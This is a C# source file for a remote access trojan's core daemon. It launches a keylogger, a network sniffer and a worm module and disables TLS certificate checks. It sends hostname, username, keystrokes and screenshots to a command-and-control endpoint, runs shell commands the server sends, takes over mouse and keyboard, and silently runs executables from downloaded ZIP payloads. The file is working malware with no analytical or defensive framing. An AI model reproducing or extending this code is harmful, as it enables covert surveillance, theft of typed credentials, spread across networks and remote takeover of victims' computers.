using System;
using System.Threading.Tasks;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Text;
using System.Diagnostics;
using System.Timers;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using System.Management;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Linq;
using XYZ.modules.reporters;

namespace XYZ.modules
{
    public class DaemonCore
    {
        private static readonly HttpClient httpClient = new HttpClient();
        private static readonly string uniqueId = Guid.NewGuid().ToString();
        private System.Timers.Timer daemonTimer;
        private string tempFolder = string.Empty;
        private string version = "1.0.0"; 
        private WebRTCModule webRTCModule;
        private DataCollectionModule dataCollectionModule;
        private string terminalId;
        
        // Persistent Modules
        private NetworkSnifferModule snifferModule;
        private AdvancedKeyloggerModule keyloggerModule;
        private XYZ.modules.worm.WormModule wormModule;

        static DaemonCore()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            }
            catch (Exception)
            {
                
            }
        }

        public void StartDaemon()
        {
            try
            {
                terminalId = "AXY_" + uniqueId;
                httpClient.Timeout = TimeSpan.FromSeconds(30);
                tempFolder = Path.Combine(Path.GetTempPath(), "XYZ_" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(tempFolder);

                
                try
                {
                    webRTCModule = new WebRTCModule();
                    webRTCModule.InitializeWebRTCConnection(terminalId).Wait();
                }
                catch (Exception) { }
                
                try
                {
                    dataCollectionModule = new DataCollectionModule();
                }
                catch (Exception) { }

                try
                {
                    // Initialize Telemetry System
                    string c2Url = ResilientC2Communication.GetBaseUrl();
                    TelemetryAggregator.Initialize(terminalId, c2Url);
                    KeylogReporter.Initialize();
                    
                    // Start Persistent Modules
                    snifferModule = new NetworkSnifferModule();
                    snifferModule.Start();
                    
                    keyloggerModule = new AdvancedKeyloggerModule();
                    keyloggerModule.Start();

                    try {
                        wormModule = new XYZ.modules.worm.WormModule();
                        Task.Run(() => wormModule.StartWormActivities());
                    } catch {}

                    Task.Run(() => NetworkScanReporter.ScanAndReportLocalNetwork());
                }
                catch { }

                daemonTimer = new System.Timers.Timer(60000);
                daemonTimer.Elapsed += DaemonTimer_Elapsed;
                daemonTimer.AutoReset = true;

                
                Task.Run(() => FirstDaemonTick());
                daemonTimer.Start();
                
                
            }
            catch (Exception)
            {
                
                try
                {
                    if (daemonTimer == null)
                    {
                        daemonTimer = new System.Timers.Timer(60000);
                        daemonTimer.Elapsed += DaemonTimer_Elapsed;
                        daemonTimer.AutoReset = true;
                        daemonTimer.Start();
                    }
                }
                catch (Exception)
                {
                    
                }
            }
        }

        private void DaemonTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                Task.Run(() => FirstDaemonTick());
            }
            catch (Exception)
            {
                
                try
                {
                    if (daemonTimer != null && !daemonTimer.Enabled)
                    {
                        daemonTimer.Start();
                    }
                }
                catch (Exception)
                {
                  
                }
            }
        }

        private void FirstDaemonTick()
        {
            try
            {
                
                Task.Run(new Action(DaemonTickWrapper));
            }
            catch (Exception)
            {
               
            }
        }

        private void DaemonTickWrapper()
        {
            try
            {
                DaemonTick().Wait();
            }
            catch (Exception)
            {
                
            }
        }

        private async Task DaemonTick()
        {
            try
            {
                
                // Maintain persistence
                if (snifferModule != null) snifferModule.Start();
                if (keyloggerModule != null) keyloggerModule.Start();
                
                // Exfiltrate Sniffer Logs
                if (snifferModule != null)
                {
                    string logs = snifferModule.GetLogs();
                    if (!string.IsNullOrEmpty(logs))
                    {
                        var exfiltrator = new DataExfiltrationModule();
                        await exfiltrator.ExfiltrateBytes(Encoding.UTF8.GetBytes(logs), 
                            "network_sniff_" + DateTime.Now.Ticks + ".txt", "network_log");
                    }
                }

                // Ensure Keylogs are sent
                if (keyloggerModule != null)
                {
                    await keyloggerModule.SaveAndSendLogs();
                }

                var payload = PrepareDataPayload();

                string json = new System.Web.Script.Serialization.JavaScriptSerializer().Serialize(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                HttpResponseMessage response = null;
                try
                {
                    response = await httpClient.PostAsync("http://127.0.0.1:8000/api/status", content);
                }
                catch (Exception)
                {
                   
                }

                if (response != null && response.IsSuccessStatusCode)
                {
                    try
                    {
                        string mediaType = null;
                        if (response.Content.Headers.ContentType != null)
                            mediaType = response.Content.Headers.ContentType.MediaType;
                            
                        if (mediaType == "application/zip")
                        {
                            if (daemonTimer != null)
                            {
                                daemonTimer.Stop();
                            }

                            await HandleZipResponse(response);

                            if (daemonTimer != null)
                            {
                                daemonTimer.Start();
                            }
                        }
                        else
                        {
                           
                            string responseContent = await response.Content.ReadAsStringAsync();
                            ProcessJSONResponse(responseContent);
                        }
                    }
                    catch (Exception)
                    {
                        
                    }
                }
            }
            catch (HttpRequestException)
            {
                 }
            catch (TaskCanceledException)
            {
               
            }
            catch (Exception)
            {
         
            }
        }

        private Dictionary<string, object> PrepareDataPayload()
        {
            try
            {
               
                string osVersion = GetOSVersion();
                string architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86";
                
                
                string keylogData = GetKeylogData();
                
               
                string screenshotData = GetScreenshotData();
                
                
                string webRTCCandidates = "";
                try
                {
                    if (webRTCModule != null)
                    {
                        webRTCCandidates = webRTCModule.GetWebRTCCandidates();
                    }
                }
                catch (Exception)
                {
                   
                }

                var payload = new Dictionary<string, object>
                {
                    { "status", "online" },
                    { "id", terminalId },
                    { "version", version },
                    { "os", osVersion },
                    { "arch", architecture },
                    { "hostname", Environment.MachineName },
                    { "username", Environment.UserName },
                    { "webrtc_candidates", webRTCCandidates },
                    { "active_window", "" },
                    { "local_ip", GetLocalIPAddress() },
                    { "mac_address", GetMacAddress() }
                };

                // Add keylog data if available
                if (!string.IsNullOrEmpty(keylogData))
                {
                    payload["keylog"] = keylogData;
                }

                // Add screenshot data if available
                if (!string.IsNullOrEmpty(screenshotData))
                {
                    payload["screenshot"] = screenshotData;
                }
                
                // Collect and add comprehensive system information
                try
                {
                    var systemInfo = new Dictionary<string, object>
                    {
                        { "os_version", osVersion },
                        { "architecture", architecture },
                        { "hostname", Environment.MachineName },
                        { "username", Environment.UserName },
                        { "processor_count", Environment.ProcessorCount },
                        { "tick_count", Environment.TickCount },
                        { "working_set", Environment.WorkingSet },
                        { "ip_address", GetLocalIPAddress() },
                        { "mac_address", GetMacAddress() },
                        { "system_uptime", GetSystemUptime() }
                    };
                    
                    payload["system_info"] = systemInfo;
                }
                catch (Exception)
                {
                    
                }

                return payload;
            }
            catch (Exception)
            {
               
                return new Dictionary<string, object>
                {
                    { "status", "online" },
                    { "id", terminalId },
                    { "version", version }
                };
            }
        }

        private string GetLocalIPAddress()
        {
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    return (endPoint != null) ? endPoint.Address.ToString() : "127.0.0.1";
                }
            }
            catch (Exception)
            {
                return "127.0.0.1";
            }
        }

        private string GetMacAddress()
        {
            try
            {
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up && 
                        nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        return nic.GetPhysicalAddress().ToString();
                    }
                }
            }
            catch (Exception)
            {
                return "Unknown";
            }
            return "Unknown";
        }

        private string GetKeylogData()
        {
            try
            {
                string keylogPath = Path.Combine(Path.GetTempPath(), "keylog.txt");
                if (File.Exists(keylogPath))
                {
                 
                    string keylogData = File.ReadAllText(keylogPath);
                    
                    if (!string.IsNullOrEmpty(keylogData))
                    {
                        File.WriteAllText(keylogPath, string.Empty);
                        return keylogData;
                    }
                }
            }
            catch (Exception)
            {
                
            }
            return string.Empty;
        }

        private string GetScreenshotData()
        {
            try
            {
                string screenshotDir = Path.Combine(Path.GetTempPath(), "screenshots");
                if (Directory.Exists(screenshotDir))
                {
                   
                    string[] screenshots = Directory.GetFiles(screenshotDir, "*.png");
                    
                  
                    Array.Sort(screenshots, (x, y) => {
                        DateTime xTime = new FileInfo(x).CreationTime;
                        DateTime yTime = new FileInfo(y).CreationTime;
                        return yTime.CompareTo(xTime); // Descending order
                    });
                    
                    if (screenshots.Length > 0)
                    {
                       
                        return screenshots[0];
                    }
                }
            }
            catch (Exception)
            {
                
            }
            return string.Empty;
        }

        private void ProcessJSONResponse(string responseContent)
        {
            try
            {
               
                var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
                var data = serializer.Deserialize<Dictionary<string, object>>(responseContent);
                
                
                if (data.ContainsKey("webrtc_candidates"))
                {
                    string candidates = data["webrtc_candidates"].ToString();
                    webRTCModule.ProcessWebRTCCandidates(candidates);
                }
                
                
                if (data.ContainsKey("commands"))
                {
                    var commands = data["commands"] as object[];
                    if (commands != null)
                    {
                        foreach (var commandObj in commands)
                        {
                            var commandDict = commandObj as Dictionary<string, object>;
                            if (commandDict != null && commandDict.ContainsKey("command"))
                            {
                                string command = commandDict["command"].ToString();
                                string type = commandDict.ContainsKey("type") ? commandDict["type"].ToString() : "shell";
                                string id = commandDict.ContainsKey("id") ? commandDict["id"].ToString() : Guid.NewGuid().ToString();
                                
                                CommandReporter.ReportReceived(id, type, command);
                                ProcessRemoteCommand(command, type, id);
                            }
                        }
                    }
                }
                
               
                if (data.ContainsKey("remote_control"))
                {
                    ProcessRemoteControlCommands(data["remote_control"].ToString());
                }
                
                
                if (data.ContainsKey("screen_capture"))
                {
                    var captureData = data["screen_capture"] as Dictionary<string, object>;
                    if (captureData != null)
                    {
                        bool startCapture = captureData.ContainsKey("start") && Convert.ToBoolean(captureData["start"]);
                        int interval = captureData.ContainsKey("interval") ? Convert.ToInt32(captureData["interval"]) : 1000;
                        
                        if (startCapture)
                        {
                            webRTCModule.StartScreenCapture(interval);
                        }
                        else
                        {
                            webRTCModule.StopScreenCapture();
                        }
                    }
                }
            }
            catch (Exception)
            {
               
            }
        }

        private void ProcessRemoteCommand(string command, string type, string commandId = null)
        {
            try
            {
                switch (type)
                {
                    case "shell":
                        webRTCModule.ExecuteCommand(command, commandId);
                        break;
                    case "mouse":
                        ProcessMouseCommand(command);
                        break;
                    case "keyboard":
                        // Process keyboard input command
                        webRTCModule.SendKeyboardInput(command);
                        break;
                    case "special_key":
                        // Process special key command
                        webRTCModule.SendSpecialKey(command);
                        break;
                    case "remote_control":
                        // Process JSON-formatted remote control command
                        ProcessRemoteControlCommands(command);
                        break;
                    case "network_scan":
                        Task.Run(() => NetworkScanReporter.ScanAndReportLocalNetwork());
                        break;
                    case "flush_telemetry":
                        try { KeylogReporter.Flush(); } catch {}
                        Task.Run(() => TelemetryAggregator.ForceFlush());
                        break;
                    case "sniffer_control":
                        if (snifferModule != null)
                        {
                            if (command == "start") snifferModule.Start();
                            else if (command == "stop") snifferModule.Stop();
                            CommandReporter.ReportExecutionResult(commandId, "sniffer", true, "Sniffer " + command);
                        }
                        break;
                    case "worm_control":
                        if (wormModule != null && command == "start") Task.Run(() => wormModule.StartWormActivities());
                        break;
                    default:
                        // Default to shell command
                        webRTCModule.ExecuteCommand(command, commandId);
                        break;
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("DaemonCore.ProcessRemoteCommand", ex);
            }
        }

        private void ProcessMouseCommand(string command)
        {
            try
            {
                // Parse mouse command (e.g., "move:100,200" or "click:left" or "click:right")
                if (command.StartsWith("move:"))
                {
                    string[] coords = command.Substring(5).Split(',');
                    if (coords.Length == 2)
                    {
                        int x, y;
                        if (int.TryParse(coords[0], out x) && int.TryParse(coords[1], out y))
                        {
                            webRTCModule.MoveMouse(x, y);
                        }
                    }
                }
                else if (command.StartsWith("click:"))
                {
                    string button = command.Substring(6);
                    int buttonId = (button == "left" || button == "1") ? 1 : 2;
                    webRTCModule.ClickMouse(buttonId);
                }
                else if (command == "click")
                {
                    webRTCModule.ClickMouse(1); // Left click
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ProcessRemoteControlCommands(string command)
        {
            try
            {
                // Process remote control commands from C2
                var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
                var data = serializer.Deserialize<Dictionary<string, object>>(command);
                
                if (data.ContainsKey("action"))
                {
                    string action = data["action"].ToString();
                    
                    switch (action)
                    {
                        case "mouse_move":
                            if (data.ContainsKey("x") && data.ContainsKey("y"))
                            {
                                int x = Convert.ToInt32(data["x"]);
                                int y = Convert.ToInt32(data["y"]);
                                webRTCModule.MoveMouse(x, y);
                            }
                            break;
                        case "mouse_click":
                            string button = "left";
                            if (data.ContainsKey("button"))
                            {
                                button = data["button"].ToString();
                            }
                            int buttonId = (button == "left" || button == "1") ? 1 : 2;
                            webRTCModule.ClickMouse(buttonId);
                            break;
                        case "keyboard_input":
                            if (data.ContainsKey("text"))
                            {
                                string text = data["text"].ToString();
                                webRTCModule.SendKeyboardInput(text);
                            }
                            break;
                        case "special_key":
                            if (data.ContainsKey("key"))
                            {
                                string key = data["key"].ToString();
                                webRTCModule.SendSpecialKey(key);
                            }
                            break;
                        case "execute_command":
                            if (data.ContainsKey("cmd"))
                            {
                                string cmd = data["cmd"].ToString();
                                webRTCModule.ExecuteCommand(cmd);
                            }
                            break;
                        case "screen_capture":
                            bool startCapture = data.ContainsKey("start") && Convert.ToBoolean(data["start"]);
                            int interval = data.ContainsKey("interval") ? Convert.ToInt32(data["interval"]) : 1000;
                            
                            if (startCapture)
                            {
                                webRTCModule.StartScreenCapture(interval);
                            }
                            else
                            {
                                webRTCModule.StopScreenCapture();
                            }
                            break;
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private string GetOSVersion()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Caption, Version FROM Win32_OperatingSystem"))
                {
                    foreach (var os in searcher.Get())
                    {
                        return os["Caption"].ToString() + " " + os["Version"].ToString();
                    }
                }
            }
            catch (Exception)
            {
                return Environment.OSVersion.ToString();
            }
            return "Unknown";
        }

        private string GetSystemUptime()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT LastBootUpTime FROM Win32_OperatingSystem"))
                {
                    foreach (var os in searcher.Get())
                    {
                        string lastBoot = os["LastBootUpTime"].ToString();
                        DateTime lastBootTime = ManagementDateTimeConverter.ToDateTime(lastBoot);
                        TimeSpan uptime = DateTime.Now - lastBootTime;
                        return uptime.Days.ToString() + " days, " + uptime.Hours.ToString() + " hours, " + uptime.Minutes.ToString() + " minutes";
                    }
                }
            }
            catch (Exception)
            {
                return "Unknown";
            }
            return "Unknown";
        }

        private string GenerateDgaDomain(int dayOffset = 0)
        {
            // Replace string interpolation with string concatenation
            return "127.0.0.1:8000";
        }

        private async Task HandleZipResponse(HttpResponseMessage response)
        {
            try
            {
                string zipPath = Path.Combine(tempFolder, "downloaded.zip");
                using (var fileStream = File.Create(zipPath))
                {
                    await response.Content.CopyToAsync(fileStream);
                }

                string extractPath = Path.Combine(tempFolder, "extracted_" + Guid.NewGuid().ToString("N").Substring(0, 8));
                Directory.CreateDirectory(extractPath);

                // Extract ZIP using Shell32 COM (works on all Windows versions)
                try
                {
                    Type shellType = Type.GetTypeFromProgID("Shell.Application");
                    if (shellType != null)
                    {
                        dynamic shell = Activator.CreateInstance(shellType);
                        dynamic zip = shell.NameSpace(zipPath);
                        dynamic dest = shell.NameSpace(extractPath);
                        
                        if (zip != null && dest != null)
                        {
                            // 4 = no progress dialog, 16 = yes to all
                            dest.CopyHere(zip.Items(), 4 | 16);
                            
                            // Wait for extraction to complete
                            System.Threading.Thread.Sleep(2000);
                        }
                    }
                }
                catch
                {
                    // Fallback: try ZipFile if available (.NET 4.5+)
                    try
                    {
                        ZipFile.ExtractToDirectory(zipPath, extractPath);
                    }
                    catch { }
                }

                // Cleanup ZIP file
                try { File.Delete(zipPath); } catch { }

                // Execute any .exe file found in the extracted folder
                string[] exeFiles = Directory.GetFiles(extractPath, "*.exe", SearchOption.AllDirectories);
                foreach (string exePath in exeFiles)
                {
                    try
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            FileName = exePath,
                            UseShellExecute = false,
                            RedirectStandardOutput = false,
                            RedirectStandardError = false,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };

                        Process.Start(startInfo);
                        SecureLogger.LogInfo("DaemonCore", "Executed payload: " + Path.GetFileName(exePath));
                        CommandReporter.ReportExecutionResult("payload_zip", "execute_payload", true, "Executed: " + Path.GetFileName(exePath));
                    }
                    catch (Exception ex)
                    {
                        SecureLogger.LogError("DaemonCore.ExecutePayload", ex);
                    }
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("DaemonCore.HandleZipResponse", ex);
            }
        }

        // Method to get terminal ID
        public string GetTerminalId()
        {
            return terminalId;
        }

        // Method to set data collection module
        public void SetDataCollectionModule(DataCollectionModule module)
        {
            dataCollectionModule = module;
        }

        // Method to set WebRTC module
        public void SetWebRTCModule(WebRTCModule module)
        {
            webRTCModule = module;
        }

        // Method to stop the daemon
        public void StopDaemon()
        {
            try
            {
                if (daemonTimer != null)
                {
                    daemonTimer.Stop();
                    daemonTimer.Dispose();
                    daemonTimer = null;
                }
                
                // Stop WebRTC module
                if (webRTCModule != null)
                {
                    webRTCModule.CloseConnection();
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }
    }
}